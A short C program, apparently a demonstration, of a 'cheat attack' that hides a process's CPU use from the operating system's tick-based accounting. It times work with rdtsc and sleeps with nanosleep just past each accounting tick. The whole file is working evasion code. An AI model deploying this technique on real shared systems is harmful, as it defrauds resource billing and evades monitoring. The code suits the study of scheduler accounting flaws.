// How to game the OS into not counting your computation: 
// Strategy is to do a little work and then sleep until the next tick. 
// this works because nanosleep(zero,NULL) sleeps until the next 
// accounting tick! So you can do a little work and then 
// sleep until *after* the clock has ticked! 

#define _POSIX_C_SOURCE 199309 
#include <time.h>
#include <sys/time.h> 
#include <stdio.h> 

struct timespec zero = {0,0}; // sleep for zero nanoseconds=after next tick!
typedef long cycle_t; 

// a sneaky trick to get the number of elapsed cycles of the high-resolution
// clock really quickly by dropping into assembler. Much faster than 
// clock_gettime(2) system call. 
inline cycle_t get_cycles()
{
    cycle_t ret;
    asm volatile("rdtsc" : "=A" (ret));
    return ret;
}

// calculate the cycles of the high resolution clock per accounting clock tick, 
// by waiting through 1000 ticks and dividing. 
cycle_t cycles_per_tick()
{
    int i; 
    nanosleep(&zero,NULL); // sync with tick
    cycle_t start = get_cycles();
    for(i=0 ; i<100 ; i++)
        nanosleep(&zero,NULL);
    return (get_cycles() - start)/100;
}

// Actually perform the attack. 
// Fraction is the fraction of time to hide 
// Overhead goes up with the fraction. 
void cheat_attack( double fraction )
{
    int i; 
    cycle_t work, tick_start, now;
    work = fraction * cycles_per_tick();
    nanosleep(&zero,NULL); 		// synchronize with next tick. 
    tick_start = get_cycles();		// start relative time measurement
    while( 1 ) {
        now = get_cycles();
        if( now - tick_start >= work ) {// done enough work; wait for tick
            nanosleep(&zero,NULL);      // avoid bill; wait till after next tick
            tick_start = get_cycles();  // start over 
        }
        // do some short work here...
	for (i=0; i<10000; i++) ; 
    }
}

int main() { 
    cheat_attack(.5); 
} 
